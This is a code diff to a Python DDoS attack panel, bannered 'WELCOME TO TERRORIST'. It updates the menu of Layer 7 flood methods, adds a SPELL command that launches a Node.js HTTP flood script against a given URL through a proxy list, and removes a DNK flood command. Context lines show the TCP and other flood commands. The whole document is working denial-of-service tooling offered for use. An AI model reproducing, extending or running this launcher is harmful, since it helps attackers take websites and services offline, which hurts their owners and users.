@@ -207,12 +207,11 @@ def layer7():
                         ║              \033[32mWELCOME TO \033[33mTERRORIST\x1b[38;5;160m              ║
                         ║     \x1b[38;5;160mTYPE '\x1b[38;5;255mMETHODS\x1b[38;5;160m' TO SEE METHOD OF ATTACK     ║
                     ╔═══╩════════════════════════════════════════════════╩═══╗
-                    ║       ●  CHAOS   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  DNK     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║ 
-                    ║       ●  SPIKE   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  CURSE   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
+                    ║       ●  CHAOS   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  SPELL   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║ 
+                    ║       ●  ENC     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  CURSE   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                     ║       ●  BROWSER [\x1b[38;2;134;20;246mPOWER!\x1b[38;5;160m]    ●  CF      [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
-                    ║       ●  HULK    [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  TLX     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
+                    ║       ●  HULK    [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  404     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                     ║       ●  KILLER  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  HTTPS   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
-                    ║       ●  404     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  NONE    [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                     ╚════════════════════════════════════════════════════════╝
 \033[0m""")
 
@@ -464,7 +463,20 @@ def main():
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mTCP <ip> <port> <thread> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mTCP 1.1.1.1 80 10 120')
-
+                
+                elif sinput == "SPELL" or sinput == "spell":
+                        try:
+                                mode = sin.split()[1]
+                                url = sin.split()[2]
+                                time = sin.split()[3]
+                                thread = sin.split()[4]
+                                Screen.wrapper(attack)
+                                os.system ("clear")
+                                os.system(f'cd L7 && node SPELL.js {mode} {url} proxy.txt {time} 10000 {thread}')  
+                        except (ValueError, IndexError):
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mSPELL <GET/POST> <url> <time> <thread>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mSPELL GET example.com 120 10')
+                
                 elif sinput == "BOW" or sinput == "bow":
                         try:
                                 url = sin.split()[1]
@@ -657,17 +669,6 @@ def main():
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mENC <url> <time> <rate>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mENC https://example.com 120 64')
-
-                elif sinput == "DNK" or sinput == "dnk":
-                        try:
-                                url = sin.split()[1]
-                                time = sin.split()[2]
-                                rate = sin.split()[3]
-                                Screen.wrapper(attack)
-                                os.system(f'cd L7 && node DNK.js {url} {time} {rate} 10 proxy.txt')
-                        except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mDNK <url> <time> <rate>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mDNK https://example.com 120 64')
 
                 else:
                         try:
